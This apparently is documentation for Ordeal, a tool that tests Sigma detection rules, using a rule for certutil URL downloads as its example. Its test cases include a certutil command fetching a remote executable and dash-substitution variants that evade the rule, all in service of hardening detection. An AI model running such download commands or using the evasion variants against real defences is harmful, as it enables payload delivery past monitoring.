# Writing Suites

A practical walkthrough: take one Sigma rule, give it a test suite, then attack
it. Fifteen minutes per rule, and the rule comes out of it measurably harder to
walk past.

The full schema is in [test-format.md](test-format.md). The evasion catalog is in
[mutators.md](mutators.md).

<!-- ------------------------------------------------------------ -->

## 1. Start From a Rule

Here is the rule under test — `rules/certutil_download/rule.yml`. Nothing about
it is Ordeal-specific; it is stock Sigma.

```yaml
title: Certutil Download From URL
id: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b
status: test
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith: '\certutil.exe'
  selection_flags:
    CommandLine|contains:
      - '-urlcache'
      - '-verifyctl'
  condition: selection_img and selection_flags
level: high
```

Read the detection block and write down what it actually requires: a process whose
image path ends in `\certutil.exe`, and a command line containing one of two
flags. Those two requirements are your first two test cases.

## 2. Write the Positive Case

The suite is a sidecar file next to the rule, named `<rule>.test.yml`. For
`rule.yml` that is `rule.test.yml`.

```yaml
rule: rule.yml

cases:
  - name: certutil urlcache download fires
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.10/a.exe a.exe'
    match: true
    selections:
      - selection_img
      - selection_flags
```

Three things worth doing on the first case:

- **Use a real command.** Take it from an engagement, a LOLBAS entry, or an
  emulation plan. A synthetic string that only contains the matched substring
  tests nothing and mutates into nothing.
- **Name it for the behavior**, not the rule. `certutil urlcache download fires`
  survives a rule rename; `test 1` does not.
- **Assert the selections.** `selections:` requires that both named selections
  actually fired. Without it, a rule whose `condition` degrades to
  `selection_img` alone still passes — and that rule now alerts on every
  certificate operation on the estate.

Use documentation ranges (`198.51.100.0/24`, `example.com`) for indicators. Suites
get committed, scanned, and shared.

## 3. Add the Negative Case

A rule that fires on everything passes every positive test. The negative case is
what makes the suite worth having.

```yaml
  - name: certutil dump is benign
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil.exe -dump C:\cert.cer'
    match: false
```

Pick the near miss, not the obvious one. `notepad.exe` not firing proves nothing.
The case that earns its place is the legitimate invocation of the *same binary* —
the one that would page someone at 03:00 if the rule were one condition looser.

`selections:` is not valid on a negative case; there is nothing to assert about
which selection fired when the rule did not fire.

## 4. Run It

```bash
ordeal run ./rules
```

```
PASS   certutil urlcache download fires
PASS   certutil dump is benign

ALL PASS  2 passed, 0 failed, 2 total
```

Color is dropped automatically on a non-TTY, so piped and CI output stays plain.

Point `run` at a file or a directory — directories are walked recursively for
`*.test.yml`. Exit `0` when everything passes, `1` on a failure, `2` on a usage
error such as an unreadable path or an unknown key in the suite.

A failure names the case and the reason:

```
FAIL   certutil urlcache download fires · selections did not fire: [selection_flags]
```

## 5. Attack It

The tests passing is the easy half. Now find out what the rule misses.

```bash
ordeal mutate ./rules
```

```
BREACH  certutil urlcache download fires  survives 6/9 evasions (67%)
        ▲ windash · CommandLine · replaced - flag prefix with forward slash
          certutil.exe /urlcache /split /f http://198.51.100.10/a.exe a.exe
        ▲ windash · CommandLine · replaced - flag prefix with en-dash
          certutil.exe –urlcache –split –f http://198.51.100.10/a.exe a.exe
        ▲ windash · CommandLine · replaced - flag prefix with em-dash
          certutil.exe —urlcache —split —f http://198.51.100.10/a.exe a.exe

EVADED  1 detections tested, 3 evasions found
```

Read each finding as a sentence: *the same download, written this way, does not
alert.* Three of them here, all the same weakness — the rule pins the ASCII
hyphen, and certutil does not care which dash you use.

Only positive inline cases are mutated. A negative case has nothing to evade, and
mutation targets the command fields of the event — `CommandLine` and its
relatives — not `Image`, which the kernel canonicalizes regardless of how the
process was launched. See [mutators.md](mutators.md).

Run both stages in one pass when you want a single command:

```bash
ordeal run ./rules --mutate
```

## 6. Close the Gaps

Work the findings in order of cheapness to the attacker. All three here are the
same weakness, so one edit closes them: the rule matches the ASCII hyphen and
certutil accepts three other prefixes. Enumerate them.

```yaml
  selection_flags:
    CommandLine|contains:
      - '-urlcache'
      - '/urlcache'
      - '–urlcache'      # en-dash
      - '—urlcache'      # em-dash
      - '-verifyctl'
      - '/verifyctl'
      - '–verifyctl'
      - '—verifyctl'
```

Sigma has a `|windash` modifier that does this expansion at compile time, and it
is the right thing to write for a SigmaHQ-bound rule. Ordeal's evaluator
(`bradleyjkemp/sigma-go`) does not implement it yet and errors with
`unknown modifier windash`, so enumerate the values while you are testing here.

Re-run and confirm the score moved:

```bash
ordeal mutate ./rules
```

```
HOLD   certutil urlcache download fires  survives 9/9 evasions (100%)
HOLD   certutil verifyctl fires  survives 9/9 evasions (100%)

NO EVASIONS  2 detections tested, 0 evasions found
```

Some findings are not fixable in the rule, and that is a legitimate outcome.
`caret-insertion` against a substring match cannot be defeated by rewriting the
substring — the answer is a different signal (process ancestry, `OriginalFileName`,
image hash, network telemetry) or an accepted, documented gap. `case-flip` is a
statement about your conversion backend, not about the rule text. See
[mutators.md](mutators.md) for the fix guidance per mutator.

When a gap is accepted rather than closed, record it. Add the case with a comment
explaining the decision so the next reviewer does not re-litigate it, or opt the
suite out with `mutate: false` if the rule is deliberately broad.

## 7. Wire It Into CI

Once the suite is green, make it a gate. See [ci.md](ci.md) for the GitHub Action,
JUnit output, and exit-code semantics.

<!-- ------------------------------------------------------------ -->

## Checking Coverage

`lint` reports the rules that have no suite at all, suites pointing at a rule that
does not exist, and suites missing a positive or negative case:

```bash
ordeal lint ./rules
```

Run it before `run` on a large corpus. An untested rule is the most common
detection gap there is, and it does not show up in a passing test report.

## Habits That Pay

- **One suite per rule.** The sidecar convention is the index. Do not build a
  central test directory.
- **Every rule gets a negative case.** Positive-only suites pass forever and prove
  nothing about precision.
- **Every rule gets an inline positive case.** Mutation skips `dataset:` cases, so
  a rule tested only against captured telemetry is never attacked.
- **Fixtures come from real telemetry.** Paste the command line from the log, then
  strip the identifying detail.
- **Mutate before you merge.** A rule reviewed, converted, and merged green can
  still be walked straight past.

---

<sub>Built by <a href="https://principlebreach.com">Principle Breach</a> — offensive security research.</sub>
